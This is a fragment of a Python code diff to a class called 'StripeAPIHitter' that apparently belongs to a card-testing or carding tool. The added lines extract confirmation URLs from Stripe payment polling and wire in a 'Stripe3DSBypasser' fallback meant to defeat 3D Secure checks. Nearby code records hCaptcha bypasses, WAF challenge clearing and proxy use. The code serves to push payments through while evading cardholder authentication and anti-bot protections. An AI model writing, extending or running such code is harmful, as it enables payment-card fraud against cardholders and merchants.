+                                        _curl = poll_json.get('return_url') or poll_json.get('success_url') or (poll_json.get('next_action', {}) or {}).get('redirect_to_url', {}).get('url') or find_receipt_url(poll_json)
+                                        if _curl:
+                                            result['confirm_url'] = _curl
                                         receipt_url = find_receipt_url(poll_json)
                                         if not receipt_url and pi and client_secret:
                                             receipt_url = await self.fetch_receipt_url(pi, client_secret, headers, proxies, profile)
@@ -2225,6 +2465,23 @@ class StripeAPIHitter:
                                     result['3ds_type'] = 'waf_challenge' if (_is_waf_gate and not _waf_cleared) else 'stripe_3ds2'
                                     result['captcha_bypassed'] = bool(_hcaptcha_token)
                                     result['raw_response'] = poll_json
+
+                                    # STAGE 3: Stripe3DSBypasser standalone resolver (friend's engine)
+                                    # Fires when the exemption sweep above still couldn't resolve —
+                                    # passes the full raw_response into the ACS/redirect resolver.
+                                    try:
+                                        result['pk_key'] = pk
+                                        _bypass_result = await Stripe3DSBypasser.resolve_3ds(
+                                            result=result,
+                                            proxy_data=proxy_data,
+                                            profile=profile
+                                        )
+                                        if _bypass_result.get('3ds_bypassed') or _bypass_result.get('success'):
+                                            return _bypass_result
+                                        result = _bypass_result  # carry forward any partial updates
+                                    except Exception as _3dsb_ex:
+                                        print(f"DEBUG: Stripe3DSBypasser fallback failed: {_3dsb_ex}")
+
                                     return result
                         except Exception as ex:
                             print(f"DEBUG: 3DS bypass failed: {ex}")
